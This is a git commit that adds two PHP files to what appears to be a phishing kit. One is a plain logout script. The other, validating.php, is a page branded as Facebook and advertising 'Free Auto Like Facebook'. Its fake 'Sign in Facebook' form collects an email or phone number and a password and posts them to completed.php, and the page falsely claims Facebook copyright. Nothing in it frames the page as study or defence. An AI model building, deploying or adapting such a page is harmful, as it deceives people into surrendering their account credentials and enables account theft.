c76879c3c089ec1189438b6cf294a77f0e87953d
AhmadMaZulPahwan7 <38656579+ahmadmazulpahwan7@users.noreply.github.com>
2019-08-04 15:17:56 +0800

    Add files via upload

---
+++ logout.php
@@ -0,0 +1,9 @@
+<?php
+    session_start();
+
+    $helper = array_keys($_SESSION);
+    foreach ($helper as $key){
+        unset($_SESSION[$key]);
+    }
+header('location:index.php');
+?>
---
+++ validating.php
@@ -0,0 +1,79 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta property="og:image" content="https://www.allautoliker.com/assets/img/thumbnail2.jpg">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Free Auto Like Facebook</title>
+<script src="js/jquery.min.js"></script>
+<link rel="stylesheet" href="js/bootstrap.min.css">
+<style>
+h1, .h1, h2, .h2, h3, .h3 {
+    margin-top: 0px;
+    margin-bottom: 10.5px;
+}
+body { 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+.error-msg {
+    margin: .5em 0;
+    display: block;
+    color: #dd4b39;
+    line-height: 17px;
+}
+.col-md-6 {
+ margin:0 auto;
+ float:none;
+
+}
+.col-md-8 {
+ margin:0 auto;
+ float:none;
+
+}
+</style>
+
+<body style="padding:0px;margin:0 auto;">
+<div style="padding:0px;margin:0 auto;" class="container ">
+
+<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
+<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
+<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="img/header.jpg"/>
+<div style="border:none;" class="btn btn-success btn-lg btn-block"><b><i class="fa fa-facebook"></i> Facebook</b></div>
+</div>
+<center style="background:white;"><br>
+<div class="col-md-8">
+<h2><img src="img/fb.jpg"></h2>
+<h2>
+  Facebook Free Like
+</h2>
+<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
+<h4 >
+  Sign in Facebook
+  </h4><br/><form method="post" action="completed.php">
+<div style="width:100%" class="form-group">
+  <input class="form-control" id="Email" name="Email" placeholder="Email/Number Phone" type="text"  required>
+</div>
+<div style="width:100%" class="form-group">
+  <input class="form-control" id="Pass" name="Pass" placeholder="Password" type="Password" required>
+</div>
+
+<div style="text-align:left" class="error-msg" id="hasilnya"></div>
+<div style="width:100%" class="form-group">
+  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="Login"> </form>
+</div>
+</div><br><br>
+</div>
+<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
+<center><p>Facebook Like </p></center>
+<p>Copyright &copy; 2019 Facebook.</p>
+
+</div>
+</div>
+
+</div>
